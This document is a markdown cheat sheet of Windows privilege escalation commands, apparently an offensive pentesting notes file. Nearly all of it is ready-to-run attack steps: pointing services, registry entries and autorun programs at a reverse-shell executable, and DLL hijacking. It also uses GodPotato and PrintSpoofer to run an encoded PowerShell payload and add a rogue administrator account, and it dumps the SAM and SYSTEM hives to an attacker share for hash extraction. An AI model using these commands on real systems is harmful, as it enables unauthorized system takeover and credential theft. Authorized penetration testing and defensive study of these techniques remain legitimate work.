# Windows Privilege Escalation
### Stored Creds
```
cmdkey /list
runas /savecred /user:admin reverse.exe
```
### Insecure Service Permission
```
./accesschk.exe /accepteula -uwcqv UserHere ServiceHere
sc.exe qc ServiceHere
sc.exe query ServiceHere
sc.exe config ServiceHere binpath= "C:\Temp\reverse.exe"
net start ServiceHere
```
### Unquoted Service Path
```
./accesschk.exe /accepteula -ucqv UserHere ServiceHere
./accesschk.exe /accepteula -uwdq "C:\"
./accesschk.exe /accepteula -uwcqv "C:\Path\"
./accesschk.exe /accepteula -uwcqv "C:\Path\To"
./accesschk.exe /accepteula -uwcqv "C:\Path\To\Unquoted Service\"
copy reverse.exe "C:\Path\To\Unquoted Service\ServiceHere.exe"
net start ServiceHere
```
### Weak Registry Permission
```
./accesschk.exe /accepteula -ucqv UserHere ServiceHere
./accesschk.exe /accepteula -uvwqk hklm\System\CurrentControlSet\services\ServiceHere
reg query hklm\System\CurrentControlSet\services\ServiceHere
reg add HKLM\SYSTEM\CurrentControlSet\services\ServiceHere /v ImagePath /t REG_EXPAND_SZ /d C:\TEMP\reverse.exe /f
net start ServiceHere
```
### Service Binary Hijack
```
./accesschk.exe /accepteula -quvw "C:\Program Files\ServicePath\Service.exe"
./accesschk.exe /accepteula -ucqv UserHere ServiceHere
copy "C:\Program Files\ServicePath\Service.exe" "C:\Temp\Service.exe.backup"
copy /Y "C:\Temp\reverse.exe" "C:\Program Files\ServicePath\Service.exe"
net start ServiceHere
```
### Service DLL Hijack
```
./accesschk.exe /accepteula -ucqv UserHere ServiceHere
sc.exe qc ServiceHere
copy ServiceHere.exe //MyIp/Share/ServiceHere.exe
sc.exe create "ServiceHere" binpath="C:\Temp\ServiceHere.exe"
# Next we run procmon as admin on our computer
# Stop and clear the capture
# Open filter and enter [Process Name] [is] ServiceHere.exe
# Turn off Show Registery Activity and Show Network Activity
# Start the capture, start the service, and look for any missing DLL
# If there is a writable location that checks for a missing DLL, we can make a reverse shell DLL with the correct name and place in that location
# Now back on the victim machine we do
net start ServiceHere
```
### Startup/Autorun
```
./accesschk.exe /accepteula wvu "C:\Program Files\Startup Program\Program.exe"
copy "C:\Program Files\Startup Program\Program.exe" "C:\Temp\Program.exe.backup"
copy /Y "C:\Temp\reverse.exe" "C:\Program Files\Startup Program\Program.exe"
shutdown /r /t 0
```
### Kernel, Last Resort
```
systeminfo > systeminfo.txt
wes systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
```
### SeImpersonatePrivilege
```
whoami /priv
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "powershell.exe -e JABjAGwA..."
.\GodPotato.exe -cmd "cmd /c net user middenss password /add && net localgroup administrators middenss /add"
.\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -c reverse.exe
```
### SeBackupPrivilege
```
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
copy C:\temp\SAM //MyIP/Share
copy C:\temp\SYSTEM //MyIP/Share
pypykatz registry --sam SAM SYSTEM
```
